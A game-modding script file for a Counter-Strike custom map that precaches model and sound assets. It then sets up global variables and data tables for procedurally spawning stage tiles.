PrecacheModel("models/luffaren/collective_floorceiling_slope1nature.mdl");
PrecacheModel("models/luffaren/collective_floorceiling_slope2nature.mdl");
PrecacheModel("models/luffaren/collective_floorceiling_slopecastle.mdl");
PrecacheModel("models/luffaren/collective_floorceiling_slopefactory.mdl");
PrecacheModel("models/luffaren/collective_floorceiling_slopefrost.mdl");
PrecacheModel("models/luffaren/collective_floorceiling_slopefrost2.mdl");
PrecacheModel("models/luffaren/collective_floorceiling_slopehalf.mdl");
PrecacheModel("models/luffaren/collective_floorceiling_slopehalfcastle.mdl");
PrecacheModel("models/luffaren/collective_floorceiling_slopehalffactory.mdl");
PrecacheModel("models/luffaren/collective_floorceiling_slopehalffrost.mdl");
PrecacheModel("models/luffaren/collective_floorceiling_slopehalffrost2.mdl");
PrecacheModel("models/luffaren/collective_floorceiling_slopehalfhell.mdl");
PrecacheModel("models/luffaren/collective_floorceiling_slopehalfnature.mdl");
PrecacheModel("models/luffaren/collective_floorceiling_slopehalfsilenthill.mdl");
PrecacheModel("models/luffaren/collective_floorceiling_slopehalfsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_floorceiling_slopehalftemple.mdl");
PrecacheModel("models/luffaren/collective_floorceiling_slopehell.mdl");
PrecacheModel("models/luffaren/collective_floorceiling_slopenature.mdl");
PrecacheModel("models/luffaren/collective_floorceiling_slopesilenthill.mdl");
PrecacheModel("models/luffaren/collective_floorceiling_slopesilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_floorceiling_slopetemple.mdl");
PrecacheModel("models/luffaren/collective_floorfactory.mdl");
PrecacheModel("models/luffaren/collective_floorfrost.mdl");
PrecacheModel("models/luffaren/collective_floorhell.mdl");
PrecacheModel("models/luffaren/collective_floornature.mdl");
PrecacheModel("models/luffaren/collective_floorsilenthill.mdl");
PrecacheModel("models/luffaren/collective_floorsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_floortemple.mdl");
PrecacheModel("models/luffaren/collective_floortemple1.mdl");
PrecacheModel("models/luffaren/collective_floor_slope.mdl");
PrecacheModel("models/luffaren/collective_floor_slope1nature.mdl");
PrecacheModel("models/luffaren/collective_floor_slopecastle.mdl");
PrecacheModel("models/luffaren/collective_floor_slopefactory.mdl");
PrecacheModel("models/luffaren/collective_floor_slopefrost.mdl");
PrecacheModel("models/luffaren/collective_floor_slopehalf.mdl");
PrecacheModel("models/luffaren/collective_floor_slopehalfcastle.mdl");
PrecacheModel("models/luffaren/collective_floor_slopehalffactory.mdl");
PrecacheModel("models/luffaren/collective_floor_slopehalffrost.mdl");
PrecacheModel("models/luffaren/collective_floor_slopehalfhell.mdl");
PrecacheModel("models/luffaren/collective_floor_slopehalfnature.mdl");
PrecacheModel("models/luffaren/collective_floor_slopehalfsilenthill.mdl");
PrecacheModel("models/luffaren/collective_floor_slopehalfsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_floor_slopehalftemple.mdl");
PrecacheModel("models/luffaren/collective_floor_slopehell.mdl");
PrecacheModel("models/luffaren/collective_floor_slopenature.mdl");
PrecacheModel("models/luffaren/collective_floor_slopesilenthill.mdl");
PrecacheModel("models/luffaren/collective_floor_slopesilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_floor_slopetemple.mdl");
PrecacheModel("models/luffaren/collective_hazfloor.mdl");
PrecacheModel("models/luffaren/collective_hidden.mdl");
PrecacheModel("models/luffaren/collective_hiddenwall.mdl");
PrecacheModel("models/luffaren/collective_hold.mdl");
PrecacheModel("models/luffaren/collective_holdcastle.mdl");
PrecacheModel("models/luffaren/collective_holdfactory.mdl");
PrecacheModel("models/luffaren/collective_holdfrost.mdl");
PrecacheModel("models/luffaren/collective_holdgeneric.mdl");
PrecacheModel("models/luffaren/collective_holdgenericcastle.mdl");
PrecacheModel("models/luffaren/collective_holdgenericfactory.mdl");
PrecacheModel("models/luffaren/collective_holdgenericfrost.mdl");
PrecacheModel("models/luffaren/collective_holdgenerichell.mdl");
PrecacheModel("models/luffaren/collective_holdgenericnature.mdl");
PrecacheModel("models/luffaren/collective_holdgenericsilenthill.mdl");
PrecacheModel("models/luffaren/collective_holdgenericsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_holdgenerictemple.mdl");
PrecacheModel("models/luffaren/collective_holdhell.mdl");
PrecacheModel("models/luffaren/collective_holdnature.mdl");
PrecacheModel("models/luffaren/collective_holdsilenthill.mdl");
PrecacheModel("models/luffaren/collective_holdsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_holdtemple.mdl");
PrecacheModel("models/luffaren/collective_info_board.mdl");
PrecacheModel("models/luffaren/collective_ladder.mdl");
PrecacheModel("models/luffaren/collective_laddercastle.mdl");
PrecacheModel("models/luffaren/collective_laddercastle1.mdl");
PrecacheModel("models/luffaren/collective_ladderfactory.mdl");
PrecacheModel("models/luffaren/collective_ladderfrost.mdl");
PrecacheModel("models/luffaren/collective_ladderhell.mdl");
PrecacheModel("models/luffaren/collective_laddernature.mdl");
PrecacheModel("models/luffaren/collective_laddersilenthill.mdl");
PrecacheModel("models/luffaren/collective_laddersilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_laddertemple.mdl");
PrecacheModel("models/luffaren/collective_liquidcastle.mdl");
PrecacheModel("models/luffaren/collective_liquidfactory.mdl");
PrecacheModel("models/luffaren/collective_liquidfrost.mdl");
PrecacheModel("models/luffaren/collective_liquidhell.mdl");
PrecacheModel("models/luffaren/collective_liquidnature.mdl");
PrecacheModel("models/luffaren/collective_liquidsilenthill.mdl");
PrecacheModel("models/luffaren/collective_liquidsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_liquidtemple.mdl");
PrecacheModel("models/luffaren/collective_liquid_fall.mdl");
PrecacheModel("models/luffaren/collective_liquid_fallcastle.mdl");
PrecacheModel("models/luffaren/collective_liquid_fallfactory.mdl");
PrecacheModel("models/luffaren/collective_liquid_fallfrost.mdl");
PrecacheModel("models/luffaren/collective_liquid_fallhell.mdl");
PrecacheModel("models/luffaren/collective_liquid_fallnature.mdl");
PrecacheModel("models/luffaren/collective_liquid_fallsilenthill.mdl");
PrecacheModel("models/luffaren/collective_liquid_fallsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_liquid_falltemple.mdl");
PrecacheModel("models/luffaren/collective_liquid_shallowcastle.mdl");
PrecacheModel("models/luffaren/collective_liquid_shallowfactory.mdl");
PrecacheModel("models/luffaren/collective_liquid_shallowfrost.mdl");
PrecacheModel("models/luffaren/collective_liquid_shallowhell.mdl");
PrecacheModel("models/luffaren/collective_liquid_shallownature.mdl");
PrecacheModel("models/luffaren/collective_liquid_shallowsilenthill.mdl");
PrecacheModel("models/luffaren/collective_liquid_shallowsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_liquid_shallowtemple.mdl");
PrecacheModel("models/luffaren/collective_liquid_streamcastle.mdl");
PrecacheModel("models/luffaren/collective_liquid_streamfactory.mdl");
PrecacheModel("models/luffaren/collective_liquid_streamfrost.mdl");
PrecacheModel("models/luffaren/collective_liquid_streamhell.mdl");
PrecacheModel("models/luffaren/collective_liquid_streamnature.mdl");
PrecacheModel("models/luffaren/collective_liquid_streamsilenthill.mdl");
PrecacheModel("models/luffaren/collective_liquid_streamsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_liquid_streamtemple.mdl");
PrecacheModel("models/luffaren/collective_liquid_tunnelcastle.mdl");
PrecacheModel("models/luffaren/collective_liquid_tunnelfactory.mdl");
PrecacheModel("models/luffaren/collective_liquid_tunnelfrost.mdl");
PrecacheModel("models/luffaren/collective_liquid_tunnelhell.mdl");
PrecacheModel("models/luffaren/collective_liquid_tunnelnature.mdl");
PrecacheModel("models/luffaren/collective_liquid_tunnelsilenthill.mdl");
PrecacheModel("models/luffaren/collective_liquid_tunnelsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_liquid_tunneltemple.mdl");
PrecacheModel("models/luffaren/collective_lowgrav.mdl");
PrecacheModel("models/luffaren/collective_lowgravcastle.mdl");
PrecacheModel("models/luffaren/collective_lowgravfrost.mdl");
PrecacheModel("models/luffaren/collective_lowgravhell.mdl");
PrecacheModel("models/luffaren/collective_lowgravnature.mdl");
PrecacheModel("models/luffaren/collective_lowgravsilenthill.mdl");
PrecacheModel("models/luffaren/collective_lowgravsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_lowgravtemple.mdl");
PrecacheModel("models/luffaren/collective_platform.mdl");
PrecacheModel("models/luffaren/collective_platform1nature.mdl");
PrecacheModel("models/luffaren/collective_platform2nature.mdl");
PrecacheModel("models/luffaren/collective_platform3nature.mdl");
PrecacheModel("models/luffaren/collective_platformcastle.mdl");
PrecacheModel("models/luffaren/collective_platformcastle1.mdl");
PrecacheModel("models/luffaren/collective_platformcastle2.mdl");
PrecacheModel("models/luffaren/collective_platformcastle3.mdl");
PrecacheModel("models/luffaren/collective_platformfactory.mdl");
PrecacheModel("models/luffaren/collective_platformfrost.mdl");
PrecacheModel("models/luffaren/collective_platformfrost2.mdl");
PrecacheModel("models/luffaren/collective_platformfrost3.mdl");
PrecacheModel("models/luffaren/collective_platformhell.mdl");
PrecacheModel("models/luffaren/collective_platformnature.mdl");
PrecacheModel("models/luffaren/collective_platformsilenthill.mdl");
PrecacheModel("models/luffaren/collective_platformsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_platformtemple.mdl");
PrecacheModel("models/luffaren/collective_platformtemple1.mdl");
PrecacheModel("models/luffaren/collective_platform_slope.mdl");
PrecacheModel("models/luffaren/collective_platform_slope1nature.mdl");
PrecacheModel("models/luffaren/collective_platform_slopecastle.mdl");
PrecacheModel("models/luffaren/collective_platform_slopefactory.mdl");
PrecacheModel("models/luffaren/collective_platform_slopefrost.mdl");
PrecacheModel("models/luffaren/collective_platform_slopefrost2.mdl");
PrecacheModel("models/luffaren/collective_platform_slopehalf.mdl");
PrecacheModel("models/luffaren/collective_platform_slopehalfcastle.mdl");
PrecacheModel("models/luffaren/collective_platform_slopehalffactory.mdl");
PrecacheModel("models/luffaren/collective_platform_slopehalffrost.mdl");
PrecacheModel("models/luffaren/collective_platform_slopehalffrost2.mdl");
PrecacheModel("models/luffaren/collective_platform_slopehalfhell.mdl");
PrecacheModel("models/luffaren/collective_platform_slopehalfnature.mdl");
PrecacheModel("models/luffaren/collective_platform_slopehalfsilenthill.mdl");
PrecacheModel("models/luffaren/collective_platform_slopehalfsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_platform_slopehalftemple.mdl");
PrecacheModel("models/luffaren/collective_platform_slopehell.mdl");
PrecacheModel("models/luffaren/collective_platform_slopenature.mdl");
PrecacheModel("models/luffaren/collective_platform_slopesilenthill.mdl");
PrecacheModel("models/luffaren/collective_platform_slopesilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_platform_slopetemple.mdl");
PrecacheModel("models/luffaren/collective_skybox_clouds.mdl");
PrecacheModel("models/luffaren/collective_teleport.mdl");
PrecacheModel("models/luffaren/collective_teleportcastle.mdl");
PrecacheModel("models/luffaren/collective_teleportfactory.mdl");
PrecacheModel("models/luffaren/collective_teleportfrost.mdl");
PrecacheModel("models/luffaren/collective_teleporthell.mdl");
PrecacheModel("models/luffaren/collective_teleportnature.mdl");
PrecacheModel("models/luffaren/collective_teleportsilenthill.mdl");
PrecacheModel("models/luffaren/collective_teleportsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_teleporttemple.mdl");
PrecacheModel("models/luffaren/collective_wall.mdl");
PrecacheModel("models/luffaren/collective_wall1hell.mdl");
PrecacheModel("models/luffaren/collective_wall1nature.mdl");
PrecacheModel("models/luffaren/collective_wall2hell.mdl");
PrecacheModel("models/luffaren/collective_wallcastle.mdl");
PrecacheModel("models/luffaren/collective_wallcastle1.mdl");
PrecacheModel("models/luffaren/collective_wallcastle2.mdl");
PrecacheModel("models/luffaren/collective_wallcastle3.mdl");
PrecacheModel("models/luffaren/collective_wallcastle4.mdl");
PrecacheModel("models/luffaren/collective_wallcastle5.mdl");
PrecacheModel("models/luffaren/collective_wallfactory.mdl");
PrecacheModel("models/luffaren/collective_wallfactory1.mdl");
PrecacheModel("models/luffaren/collective_wallfrost.mdl");
PrecacheModel("models/luffaren/collective_wallhell.mdl");
PrecacheModel("models/luffaren/collective_wallnature.mdl");
PrecacheModel("models/luffaren/collective_wallsilenthill.mdl");
PrecacheModel("models/luffaren/collective_wallsilenthill1.mdl");
PrecacheModel("models/luffaren/collective_wallsilenthill1dark.mdl");
PrecacheModel("models/luffaren/collective_wallsilenthill2.mdl");
PrecacheModel("models/luffaren/collective_wallsilenthill2dark.mdl");
PrecacheModel("models/luffaren/collective_wallsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_walltemple.mdl");
PrecacheModel("models/luffaren/collective_walltemple1.mdl");
PrecacheModel("models/luffaren/collective_walltemple2.mdl");
PrecacheModel("models/luffaren/destructo_hammer.mdl");
PrecacheModel("models/luffaren/explosive_barrel.mdl");
PrecacheModel("models/luffaren/flight .mdl");
PrecacheModel("models/luffaren/flight.mdl");
PrecacheModel("models/luffaren/floor_indicator.mdl");
PrecacheModel("models/luffaren/genericphys_1.mdl");
PrecacheModel("models/luffaren/genericphys_2.mdl");
PrecacheModel("models/luffaren/genericphys_3.mdl");
PrecacheModel("models/luffaren/genericphys_4.mdl");
PrecacheModel("models/luffaren/genericphys_5.mdl");
PrecacheModel("models/luffaren/gust.mdl");
PrecacheModel("models/luffaren/heal_orb.mdl");
PrecacheModel("models/luffaren/jarjar_boss.mdl");
PrecacheModel("models/luffaren/kamikaze_plane.mdl");
PrecacheModel("models/luffaren/landmine.mdl");
PrecacheModel("models/luffaren/luffaren_kart.mdl");
PrecacheModel("models/luffaren/luffaren_kartphys.mdl");
PrecacheModel("models/luffaren/peanut_butter.mdl");
PrecacheModel("models/luffaren/peanut_butter_can.mdl");
PrecacheModel("models/luffaren/piggyback.mdl");
PrecacheModel("models/luffaren/pizza.mdl");
PrecacheModel("models/luffaren/planetcrystal.mdl");
PrecacheModel("models/luffaren/planetcrystal_fx.mdl");
PrecacheModel("models/luffaren/poise.mdl");
PrecacheModel("models/luffaren/puller.mdl");
PrecacheModel("models/luffaren/rift.mdl");
PrecacheModel("models/luffaren/rise_ending_hazliquid.mdl");
PrecacheModel("models/luffaren/roar.mdl");
PrecacheModel("models/luffaren/skybox_castle1.mdl");
PrecacheModel("models/luffaren/skybox_castle2.mdl");
PrecacheModel("models/luffaren/skybox_castle3.mdl");
PrecacheModel("models/luffaren/skybox_castle4.mdl");
PrecacheModel("models/luffaren/skybox_castle5.mdl");
PrecacheModel("models/luffaren/skybox_castle6.mdl");
PrecacheModel("models/luffaren/skybox_factory.mdl");
PrecacheModel("models/luffaren/skybox_frost.mdl");
PrecacheModel("models/luffaren/skybox_hell.mdl");
PrecacheModel("models/luffaren/skybox_nature.mdl");
PrecacheModel("models/luffaren/skybox_temple.mdl");
PrecacheModel("models/luffaren/slotmachine.mdl");
PrecacheModel("models/luffaren/slotmachine_mini.mdl");
PrecacheModel("models/luffaren/spikes.mdl");
PrecacheModel("models/luffaren/squid.mdl");
PrecacheModel("models/luffaren/stone.mdl");
PrecacheModel("models/luffaren/storm_blade_refract.mdl");
PrecacheModel("models/luffaren/storm_blade_sword.mdl");
PrecacheModel("models/luffaren/the_collective.mdl");
PrecacheModel("models/luffaren/thigh_spider.mdl");
PrecacheModel("models/luffaren/vauff_world_eater.mdl");
PrecacheModel("models/lutils/healthprop.mdl");
PrecacheModel("models/player/custom_player/luffaren/chadthundercock.mdl");
PrecacheModel("models/player/custom_player/luffaren/jarjarbinks.mdl");
PrecacheModel("models/player/custom_player/luffaren/mister_muscle.mdl");
PrecacheModel("models/player/custom_player/luffaren/pizzaplayer.mdl");
PrecacheModel("models/player/custom_player/luffaren/playercheap_ct.mdl");
//PrecacheModel("models/player/custom_player/luffaren/playercheap_ct_nohitbox.mdl");				//__CSS__ removed model
//PrecacheModel("models/player/custom_player/luffaren/playercheap_invisible.mdl");				//__CSS__ removed model
//PrecacheModel("models/player/custom_player/luffaren/playercheap_invisible_nohitbox.mdl");		//__CSS__ removed model
PrecacheModel("models/player/custom_player/luffaren/playercheap_t.mdl");
//PrecacheModel("models/player/custom_player/luffaren/playercheap_t_nohitbox.mdl");				//__CSS__ removed model
PrecacheModel("models/player/custom_player/luffaren/santa.mdl");
PrecacheModel("models/props_combine/combinebutton.mdl")		//__CSS__ old model used (csgo):      models/weapons/w_eq_bumpmine.mdl
//-------------------------------------------------------------------------------------------------------------------------------------
PrecacheSound("*luffaren/boostpad_wet.mp3");
PrecacheSound("#music/luffaren_collective/mountains.mp3");
PrecacheSound("#music/luffaren_collective/sins_father.mp3");
PrecacheSound("#music/luffaren_collective/we_were_soldiers.mp3");
PrecacheSound("#music/luffaren_collective/starjump.mp3");
PrecacheSound("#music/luffaren_collective/emerald_princess.mp3");
PrecacheSound("#music/luffaren_collective/valravn.mp3");
PrecacheSound("#music/luffaren_collective/like_you_imagined.mp3");
PrecacheSound("*luffaren/click1.mp3");
PrecacheSound("*luffaren/kart_win.mp3");
PrecacheSound("*luffaren/letsago.mp3");
PrecacheSound("*luffaren/kart_start_1.mp3");
PrecacheSound("*luffaren/kart_start_2.mp3");
PrecacheSound("#music/luffaren_collective/toads_turnpike.mp3");
PrecacheSound("*luffaren/pizzadoom.mp3");
PrecacheSound("*luffaren/pizza_aggressive.mp3");
PrecacheSound("*luffaren/pizza_splotion.mp3");
PrecacheSound("*luffaren/popgasm.mp3");
PrecacheSound("*luffaren/whip_me_daddy.mp3");
PrecacheSound("*luffaren/stuka_boom.mp3");
PrecacheSound("*luffaren/stuka_boomx.mp3");
PrecacheSound("*luffaren/stuka.mp3");
PrecacheSound("*luffaren/banzai.mp3");
PrecacheSound("*luffaren/nadehit.mp3");
PrecacheSound("*luffaren/punch.mp3");
PrecacheSound("*luffaren/fuggin_open.mp3");
PrecacheSound("*luffaren/explode_1.mp3");
PrecacheSound("*luffaren/explode_4.mp3");
PrecacheSound("*luffaren/shellbert_despair.mp3");
PrecacheSound("*luffaren/eyelid_flesh.mp3");
PrecacheSound("*luffaren/sliced.mp3");
PrecacheSound("*luffaren/banana_slip.mp3");
PrecacheSound("*luffaren/fling_item.mp3");
PrecacheSound("*luffaren/roar.mp3");
PrecacheSound("*luffaren/fart_reverb.mp3");
PrecacheSound("*luffaren/huh.mp3");
PrecacheSound("*luffaren/slotmachine_reward.mp3");
PrecacheSound("*luffaren/slotmachine_debuff.mp3");
PrecacheSound("*luffaren/slotmachine_roll.mp3");
PrecacheSound("*luffaren/fart.mp3");
PrecacheSound("*luffaren/fart_wet.mp3");
PrecacheSound("*luffaren/fart_wet_short.mp3");
PrecacheSound("*luffaren/agony.mp3");
PrecacheSound("*luffaren/papaj_nooo.mp3");
PrecacheSound("*luffaren/papaj_mommy.mp3");
PrecacheSound("*luffaren/zolix_drunk.mp3");
PrecacheSound("*luffaren/luff_hello.mp3");
PrecacheSound("*luffaren/gachi_fuckyou.mp3");
PrecacheSound("*luffaren/emotional_damage.mp3");
PrecacheSound("*luffaren/dad_snore.mp3");
PrecacheSound("*luffaren/minging.mp3");
PrecacheSound("*luffaren/copy_that.mp3");
PrecacheSound("*luffaren/chrishansen_1.mp3");
PrecacheSound("*luffaren/chrishansen_7.mp3");
PrecacheSound("*luffaren/chrishansen_8.mp3");
PrecacheSound("*luffaren/chrishansen_9.mp3");
PrecacheSound("*luffaren/squid_idle.mp3");
PrecacheSound("*luffaren/squish.mp3");
PrecacheSound("*luffaren/squid_impact.mp3");
PrecacheSound("*luffaren/squid_fly.mp3");
PrecacheSound("*luffaren/berserker_sword_death.mp3");
PrecacheSound("*luffaren/clang.mp3");
PrecacheSound("*luffaren/spork.mp3");
PrecacheSound("*luffaren/billnye_turnoff.mp3");
PrecacheSound("*luffaren/billnye.mp3");
PrecacheSound("*luffaren/hackerman.mp3");
PrecacheSound("*luffaren/kart_bob.mp3");
PrecacheSound("*luffaren/greasy_fingers.mp3");
PrecacheSound("*luffaren/poise.mp3");
PrecacheSound("*luffaren/dragon_wing.mp3");
PrecacheSound("*luffaren/gust.mp3");
PrecacheSound("*luffaren/puller.mp3");
PrecacheSound("*luffaren/get_over_here.mp3");
PrecacheSound("*luffaren/bhop_steroids.mp3");
PrecacheSound("*luffaren/sussy_baki.mp3");
PrecacheSound("*luffaren/sussy_baki_amogus.mp3");
PrecacheSound("*luffaren/cplanet_earth.mp3");
PrecacheSound("*luffaren/cplanet_fire.mp3");
PrecacheSound("*luffaren/cplanet_wind.mp3");
PrecacheSound("*luffaren/cplanet_water.mp3");
PrecacheSound("*luffaren/cplanet_goplanet.mp3");
PrecacheSound("*luffaren/rift_spawn.mp3");
PrecacheSound("*luffaren/rift_teleport.mp3");
PrecacheSound("*luffaren/i_am_the_storm_cut.mp3");
PrecacheSound("*luffaren/heal_orb.mp3");
PrecacheSound("*luffaren/jumper_item.mp3");
PrecacheSound("#music/luffaren_collective/free_bird.mp3");
PrecacheSound("#music/luffaren_collective/tropic_birds.mp3");
PrecacheSound("#music/luffaren_collective/i_ran.mp3");
PrecacheSound("#music/luffaren_collective/cult_of_personality.mp3");
PrecacheSound("#music/luffaren_collective/heretic_hero.mp3");
PrecacheSound("*luffaren/silenthill_siren.mp3");
PrecacheSound("#music/luffaren_collective/realms_of_madmen.mp3");
PrecacheSound("#music/luffaren_collective/liquid_love.mp3");
PrecacheSound("#music/luffaren_collective/heretic.mp3");
PrecacheSound("#music/luffaren_collective/mesh.mp3");
PrecacheSound("#music/luffaren_collective/tcf.mp3");
PrecacheSound("#music/luffaren_collective/chosen_by_the_planet.mp3");
PrecacheSound("#music/luffaren_collective/dark_messenger.mp3");
PrecacheSound("#music/luffaren_collective/the_castle.mp3");
PrecacheSound("#music/luffaren_collective/the_devil.mp3");
PrecacheSound("#music/luffaren_collective/rear_garden.mp3");
PrecacheSound("#music/luffaren_collective/rear_garden2.mp3");
PrecacheSound("#music/luffaren_collective/dizzy.mp3");
PrecacheSound("#music/luffaren_collective/traw.mp3");
PrecacheSound("#music/luffaren_collective/junction_seven.mp3");
PrecacheSound("#music/luffaren_collective/ethical.mp3");
PrecacheSound("#music/luffaren_collective/ghosts.mp3");
PrecacheSound("#music/luffaren_collective/memories_of_dust.mp3");
PrecacheSound("#music/luffaren_collective/mourning.mp3");
PrecacheSound("#music/luffaren_collective/woodfall.mp3");
PrecacheSound("#music/luffaren_collective/nature_beats.mp3");
PrecacheSound("#music/luffaren_collective/woods_of_mystery.mp3");
PrecacheSound("#music/luffaren_collective/jungle_sounds.mp3");
PrecacheSound("#music/luffaren_collective/jungle_sounds2.mp3");
PrecacheSound("#music/luffaren_collective/mechanicus.mp3");
PrecacheSound("#music/luffaren_collective/demonic_chanting.mp3");
PrecacheSound("#music/luffaren_collective/so_below.mp3");
PrecacheSound("#music/luffaren_collective/gothic_1.mp3");
PrecacheSound("#music/luffaren_collective/gothic_2.mp3");
PrecacheSound("#music/luffaren_collective/gothic_3.mp3");
PrecacheSound("#music/luffaren_collective/gothic_4.mp3");
PrecacheSound("*luffaren/thunder_dist_2.mp3");
PrecacheSound("#music/luffaren_collective/wind_sounds.mp3");
PrecacheSound("#music/luffaren_collective/godswood.mp3");
PrecacheSound("#music/luffaren_collective/phendrana.mp3");
PrecacheSound("#music/luffaren_collective/phendrana_short.mp3");
PrecacheSound("#music/luffaren_collective/terror_in_the_depths.mp3");
PrecacheSound("#music/luffaren_collective/true.mp3");
PrecacheSound("#music/luffaren_collective/forest.mp3");
PrecacheSound("#music/luffaren_collective/laura_piano.mp3");
PrecacheSound("#music/luffaren_collective/black_fairy.mp3");
PrecacheSound("#music/luffaren_collective/alive.mp3");
PrecacheSound("#music/luffaren_collective/down_time.mp3");
PrecacheSound("#music/luffaren_collective/ill_kill_you.mp3");
PrecacheSound("#music/luffaren_collective/silent_heaven.mp3");
PrecacheSound("*luffaren/steam_message.mp3");
PrecacheSound("*luffaren/discord_message.mp3");
PrecacheSound("*luffaren/discord_leave.mp3");
PrecacheSound("*luffaren/windows_plug_out.mp3");
PrecacheSound("*luffaren/windows_plug_in.mp3");
PrecacheSound("*luffaren/eye_terror.mp3");
PrecacheSound("#music/luffaren_collective/grained.mp3");
PrecacheSound("#music/luffaren_collective/confronting_myself_infinite_static.mp3");
PrecacheSound("#music/luffaren_collective/confronting_myself_loop.mp3");
PrecacheSound("#music/luffaren_collective/confronting_myself_loop_infinite.mp3");
PrecacheSound("#music/luffaren_collective/confronting_myself_start.mp3");
PrecacheSound("*luffaren/sparg.mp3");
PrecacheSound("*luffaren/sparggg.mp3");
PrecacheSound("*luffaren/spargg.mp3");
PrecacheSound("*luffaren/thunder_dist_1.mp3");
PrecacheSound("*luffaren/thunder_dist_3.mp3");
PrecacheSound("*luffaren/eye_terror2.mp3");
PrecacheSound("*luffaren/eye_terror3.mp3");
PrecacheSound("*luffaren/eye_terror4.mp3");
PrecacheSound("*luffaren/eye_terror5.mp3");
PrecacheSound("*luffaren/horn1_default.mp3");
PrecacheSound("*luffaren/horn2_default.mp3");
PrecacheSound("*luffaren/mk64_racestart.wav");
PrecacheSound("weapons/sensorgrenade/sensor_explode.wav");
PrecacheSound("weapons/g3sg1/g3sg1_distant_01.wav");
PrecacheSound("*weapons/sensorgrenade/sensor_explode.wav");
PrecacheSound("*weapons/c4/c4_explode1.wav");
PrecacheSound("*weapons/hegrenade/beep.wav");
PrecacheSound("*player/vo/seal_epic/bomb_pre_explosion_03.wav");
PrecacheSound("*weapons/molotov/fire_ignite_5.wav");
PrecacheSound("physics/flesh/flesh_squishy_impact_hard4.wav");
PrecacheSound("physics/flesh/flesh_squishy_impact_hard3.wav");
PrecacheSound("physics/metal/metal_barrel_impact_hard7.wav");
PrecacheSound("*ambient/wind/wind_snippet5.wav");
PrecacheSound("*physics/concrete/concrete_break2.wav");
PrecacheSound("*ambient/wind/windgust.wav");
PrecacheSound("*ambient/water/wave1.wav");
PrecacheSound("*ambient/water_splash3.wav");
PrecacheSound("physics/concrete/concrete_break2.wav");


















::delay_timer <- 0.00;
::delay_timer_msg <- 0.00;
stage_edict_count <- 0;
stage_edict_counts <- [];
debugged <- false;
maker <- null;
if(!("maps" in this))::maps <- [];
stage_end_pos <- null;
pos <- Vector(512,0,0);
posoffset <- Vector();
posdir <- Vector(1,0,0);
current_dir <- "east";
spot <- uaw;
::TPmovequeue <- [];
::TPenableindex <- 0;
::TPmoveheightoffset <- 10;
::SpawnQueue <- [];
::SpawnQueueSpawner <- [];
::lastprecipitation <- 0;
::liquid_maker <- null;
::liquid_spawnqueue <- [];
::model_maker <- null;
::model_spawnqueue <- [];
::movelinear_maker <- null;
::movelinear_spawnqueue <- [];
::ladder_maker <- null;
::ladder_spawnqueue <- [];
::boostpad_maker <- null;
::boostpad_spawnqueue <- [];
::finale_started <- false;
::finale_bossplat_lighting <- true;		//__CSS__ boss_plat_lighting
::finale_post_impostor <- false;
DEBUG_MCYC <- false;
DEBUG_MCYC_RACE <- false;
::breakable_fxamt <- 0;
::snowstorm_overlay <- 0;
::snowstorm_overlay_allowset <- true;		//set to 'false' to disallow setting the snowstorm overlay
::silenthill_transdelay <- 10.00;
::silenthill_siren_stack <- 2;
::silenthill_siren_pitch_min <- 98;
::silenthill_siren_pitch_max <- 101;

//__CSS__ webscript - makes the transition smoother/less laggy
::silenthill_darkworld_tickbuffer <- 2;
::silenthill_tfade_amt <- 51;
::silenthill_tfade_rate <- 0.10;

::silenthill_ending_finale_fadedist <- 20000;
::silenthill_ending_finale_fadedensity <- 1.00;
::silenthill_darkworld <- false;		//read-only, internal value for the state itself

if(!("legit_win" in this))::legit_win <- true;
if(!("SESSION_ID" in this))
{
	::SESSION_ID <- "#SESSION_ID_ERROR#";
	try{//just to be safe, can't have shit fucking up here
		::SESSION_ID<-"#"+UniqueString().slice(0,5)+UniqueString().slice(0,3)+"#";
	}catch(e){}
}

::MAPDATA <- {};
function GenerateMapData(mapspawnindex)
{
	::MAPDATA[mapspawnindex] <- {
			id = "#00000",
			name = "MAP_NAME",
			author = "AUTHOR_NAME",
		buttoncount_1 = 0,
		buttoncount_2 = 0,
		buttoncount_3 = 0,
		buttoncount_4 = 0,
		buttoncount_end = 0,
		postspawnlogic = [],			//array of tables:{function Run(){}}	- runs once post-tile-spawn
		deaths = 0,						//how many humans were deemed to die on this stage (based on closest stage-distance on-death)
		tpdests_1 = [],
		tpdests_2 = [],
		tpdests_3 = [],
		tpdests_4 = [],
		start_pos = Vector(),			//floor-edge position of the start
		end_pos = Vector(),				//floor-edge position of the end
		center_pos = Vector(),			//center position of the pixel map itself, Z is median of start_pos.z|end_pos.z
		tp_pos = Vector(),				//the 'safe' teleport position for players, since 'start_pos' is on the very edge
		direction_current = Vector(),	//the spawn-direction of 'this' stage		(direction vector)
		direction_next = Vector(),		//the spawn-direction of the next stage		(direction vector)
		hazplane_elev_bottom = null,
		hazplane_elev_top = null,
		hazplane_movespeed = null,
		hazplane_harsh = false,
		moveplat_speed = null,			//null:MEDIUM, true:FAST, false:SLOW
		moveplat_destinations = [null,null,null,null,null,null,null,null,null,null,null,null,null,null],
	};
}
::TYPES <- {}
	::TYPES[0]<-	{name="EMPTY",						color=Vector(255,255,255),			cost=0,			elevation=null,		};
	::TYPES[1]<-	{name="WALL",						color=Vector(0,0,0),				cost=1,			elevation=null,		};
	::TYPES[2]<-	{name="START_END",					color=Vector(163,73,164),			cost=1,			elevation=null,		};
	::TYPES[3]<-	{name="LADDER",						color=Vector(228,210,124),			cost=2,			elevation=null,		};
	::TYPES[4]<-	{name="CLIMBHARD",					color=Vector(210,135,32),			cost=2,			elevation=null,		};
